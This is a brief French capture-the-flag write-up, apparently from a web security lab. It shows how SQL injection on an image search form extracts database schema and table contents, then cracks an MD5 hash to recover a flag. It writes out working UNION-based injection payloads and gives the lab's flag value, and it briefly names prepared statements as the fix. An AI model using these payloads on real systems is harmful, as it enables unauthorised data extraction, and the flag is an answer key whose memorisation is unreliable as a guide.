### Comment obtenir le flag
En allant sur la page de recherche d'image `?page=searchimg`, on a un formulaire nécessitant un id correspondant à une image. De la même maniere que le flag03, nous allons essayer d'appliquer une requête SQL sur ce formulaire pour récupérer les informations de la BDD : `1 or 1 UNION select table_name, column_name FROM information_schema.columns`  

Parmi les informations récuperées, nous allons afficher les colonnes `title` et `comment` de la table `list_images` : `1 or 1 UNION SELECT title, comment FROM list_images`  
> Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

`1928e8083cf461a51303633093573c46` est le hash MD5 de `albatroz`. Le hash SHA256 de `albatroz` est `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Expliquer la faille
Idem flag03 (injection SQL + attaque par dictionnaire)  

### Comment la corriger
Idem flag03 (requêtes préparées + `password_hash`)  
